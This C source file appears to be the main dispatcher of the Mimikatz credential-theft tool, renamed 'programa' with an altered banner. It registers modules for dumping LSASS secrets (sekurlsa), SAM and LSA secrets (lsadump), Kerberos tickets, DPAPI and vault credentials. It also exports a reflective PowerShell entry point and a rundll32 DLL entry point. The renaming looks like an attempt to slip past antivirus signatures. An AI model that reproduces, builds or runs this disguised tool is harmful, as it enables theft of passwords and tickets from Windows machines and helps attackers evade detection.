
#include "programa.h"

const KUHL_M * programa_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_vault,
	&kuhl_m_minesweeper,
#if defined(NET_MODULE)
	&kuhl_m_net,
#endif
	&kuhl_m_dpapi,
	&kuhl_m_busylight,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	&kuhl_m_iis,
	&kuhl_m_rpc,
	&kuhl_m_sr98,
	&kuhl_m_rdm,
	&kuhl_m_acr,
};

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;
#if !defined(_POWERKATZ)
	size_t len;
	wchar_t input[0xffff];
#endif
	programa_begin();
	for(i = programa_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
	{
		kprintf(L"\n" programa L"(" programa_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
		status = programa_dispatchCommand(argv[i]);
	}
#if !defined(_POWERKATZ)
	while (status != STATUS_FATAL_APP_EXIT)
	{
		kprintf(L"\n" programa L" # "); fflush(stdin);
		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
		{
			if(input[len - 1] == L'\n')
				input[len - 1] = L'\0';
			kprintf_inputline(L"%s\n", input);
			status = programa_dispatchCommand(input);
		}
	}
#endif
	programa_end();
	return STATUS_SUCCESS;
}

void programa_begin()
{
	kull_m_output_init();
#if !defined(_POWERKATZ)
	SetConsoleTitle(programa L" " programa_VERSION L" " programa_ARCH L" (oe.eo)");
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#endif
	kprintf(L"\n ta gnwsta");
	programa_initOrClean(TRUE);
}

void programa_end()
{
	programa_initOrClean(FALSE);
#if !defined(_POWERKATZ)
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	kull_m_output_clean();
#if !defined(_WINDLL)
	ExitProcess(STATUS_SUCCESS);
#endif
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	programa_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS programa_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&programa_NT_MAJOR_VERSION, &programa_NT_MINOR_VERSION, &programa_NT_BUILD_NUMBER);
		programa_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
#if defined(_POWERKATZ)
			if(hr != RPC_E_CHANGED_MODE)
#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(programa_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (programa_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), programa_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS programa_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = programa_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS programa_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(programa_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, programa_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < programa_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, programa_modules[indexModule]->commands[indexCommand].command) == 0)
							status = programa_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(programa_modules); indexModule++)
			{
				kprintf(L"\n%16s", programa_modules[indexModule]->shortName);
				if(programa_modules[indexModule]->fullName)
					kprintf(L"  -  %s", programa_modules[indexModule]->fullName);
				if(programa_modules[indexModule]->description)
					kprintf(L"  [%s]", programa_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, programa_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", programa_modules[indexModule]->shortName);
			if(programa_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", programa_modules[indexModule]->fullName);
			if(programa_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", programa_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < programa_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", programa_modules[indexModule]->commands[indexCommand].command);
				if(programa_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", programa_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_programa(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif

#if defined(_WINDLL)
void CALLBACK programa_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
	int argc = 0;
	wchar_t ** argv;
	if(AllocConsole())
	{
#pragma warning(push)
#pragma warning(disable:4996)
		freopen("CONOUT$", "w", stdout);
		freopen("CONOUT$", "w", stderr);
		freopen("CONIN$", "r", stdin);
#pragma warning(pop)
		if(lpszCmdLine && lstrlenW(lpszCmdLine))
		{
			if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
			{
				wmain(argc, argv);
				LocalFree(argv);
			}
		}
		else wmain(0, NULL);
	}
}
#endif

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;